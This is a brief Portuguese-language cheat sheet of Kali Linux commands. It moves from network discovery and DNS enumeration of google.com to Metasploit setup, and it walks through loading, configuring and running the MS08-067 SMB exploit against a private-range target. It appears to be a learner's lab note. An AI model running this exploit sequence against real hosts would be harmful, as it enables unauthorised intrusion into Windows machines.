*** Ferramentas**
*** Encontrar IPs na REDE**
* $netstat -nat

*** Ver meu IP**
* $ifconfig

*** -DNSENUN (Lista DNS)**
* $dnsenum -enum google.com

*** Dicas (Explora uma falha e injeta (Um Payload))**
* -Exploit (Shell, VNC, Meterpreter)
*** ##Comandos**
*** **Start the Kali PostgreSQL Service**
* root@kali:~# service postgresql start

*** **Initialise the Metasploit PostgreSQL Database**
* root@kali:~# msfdb init

*** **Initialise the Metasploit PostgreSQL Database**
* root@kali:~# msfdb init

*** **Inicia po console**
* root@kali:~# msfconsole

*** **Verificar Conexao**
* msf > db_status
* [*] postgresql connected to msf

*** **Fazer Buscas**
* msf > search -h
*** EXEMPLO**
* msf > search cve:2015 type:exploit app:client
* msf > search Internet Explore
* msf > search netapi
* msf > use exploit/windows/smb/ms08_067_netapi 
* msf exploit(ms08_067_netapi) > 
* msf exploit(ms08_067_netapi) > show options

*** **Configurando o Exploit**
* msf exploit(ms08_067_netapi) > set RHOST 10.0.0.3
* RHOST => 10.0.0.3
* msf exploit(ms08_067_netapi) > show options

*** Module options (exploit/windows/smb/ms08_067_netapi):**

*    Name     Current Setting  Required  Description
*    ----     ---------------  --------  -----------
*    RHOST    10.0.0.3         yes       The target address
*    RPORT    445              yes       The SMB service port
*    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


* Exploit target:

*    Id  Name
*    --  ----
*    0   Automatic Targeting


* msf exploit(ms08_067_netapi) > run (Para Executar)


* -Payload(Payload = Codigo que executa uma tarefa)
* -Framework	




















